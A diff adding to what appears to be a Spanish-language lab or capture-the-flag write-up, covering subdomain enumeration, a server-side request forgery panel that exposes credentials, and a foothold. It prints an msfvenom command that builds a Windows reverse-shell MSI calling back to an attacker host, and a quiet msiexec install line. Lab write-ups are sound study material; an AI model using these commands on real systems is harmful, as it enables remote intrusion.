@@ -70,5 +70,29 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 
+Enumeracion de subdominios
+
+
 ![[Pasted image 20250525133303.png]]
 
+
+vemos que tenemos un subdominio llamado staggin, aqui tenemos un panel donde podemos hacer un server side request forgery y ver credenciales.
+
+
+
+![[Pasted image 20250526073537.png]]
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
+
+
+
+
+lo descargamos y ejecutamos:
+
+```powershell
+msiexec /quiet /qn /i  reverse.msi
+```
+
+
+
+![[Pasted image 20250526074606.png]]
